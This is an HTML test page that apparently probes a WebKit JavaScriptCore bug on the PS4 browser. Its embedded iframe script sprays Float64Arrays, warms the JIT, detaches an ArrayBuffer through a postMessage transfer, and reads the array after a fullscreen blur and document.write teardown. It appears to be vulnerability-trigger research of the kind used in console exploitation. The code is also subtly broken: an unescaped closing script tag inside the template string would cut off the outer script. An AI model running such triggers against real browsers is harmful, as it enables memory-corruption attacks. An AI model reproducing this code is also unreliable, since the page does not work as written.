<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit JSC Root Cause Test</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { font-size:16px; margin:5px; }
#log { white-space:pre-wrap; font-size:13px; }
iframe { width:1px; height:1px; border:0; }
</style>
</head>
<body>

<h2>PS4 WebKit – JSC Float64Array Root Cause Test</h2>

<button onclick="runTest('A')">TEST A – No JIT</button>
<button onclick="runTest('B')">TEST B – JIT Hot</button>
<button onclick="runTest('C')">TEST C – JIT + Neuter</button>

<pre id="log"></pre>

<iframe id="frame"></iframe>

<script>
const log = msg => {
  document.getElementById('log').textContent += msg + "\n";
};

window.addEventListener("message", e => {
  log("[MSG] " + e.data);
});

function runTest(mode) {
  document.getElementById('log').textContent = "";
  log("=== START TEST " + mode + " ===");

  const iframe = document.getElementById("frame");
  const doc = iframe.contentDocument;
  doc.open();
  doc.write(makeIframeHTML(mode));
  doc.close();
}

function makeIframeHTML(mode) {
return `
<!DOCTYPE html>
<html>
<body>
<script>
const send = m => parent.postMessage(m, "*");

let f64 = new Float64Array(8);
f64[0] = 13.37;

let spray = [];
for (let i=0;i<500;i++) spray.push(new Float64Array(16));

send("[ALLOC] Float64Array length=" + f64.length);
send("[SNAPSHOT] before fullscreen f64[0]=" + f64[0]);

// TEST B/C: force JIT profiling
if ("${mode}" !== "A") {
  send("[JIT] warming up TypedArray access");
  let sum = 0;
  for (let i=0;i<200000;i++) {
    sum += f64[0];
  }
  send("[JIT] warmup done sum=" + sum);
}

// TEST C: neuter backing store explicitly
if ("${mode}" == "C") {
  send("[NEUTER] transferring ArrayBuffer");
  const buf = f64.buffer;
  parent.postMessage("x", "*", [buf]);
  send("[NEUTER] done f64.length=" + f64.length);
}

// FULLSCREEN + BLUR
document.documentElement.webkitRequestFullscreen();

window.onblur = () => {
  send("[EVENT] blur");

  send("[SNAPSHOT] after blur f64.length=" + f64.length);
  send("[SNAPSHOT] after blur f64[0]=" + f64[0]);

  send("[TEARDOWN] document.write");
  document.open();
  document.write("<h1>teardown</h1>");
  document.close();
};
</script>
</body>
</html>
`;
}
</script>

</body>
</html>
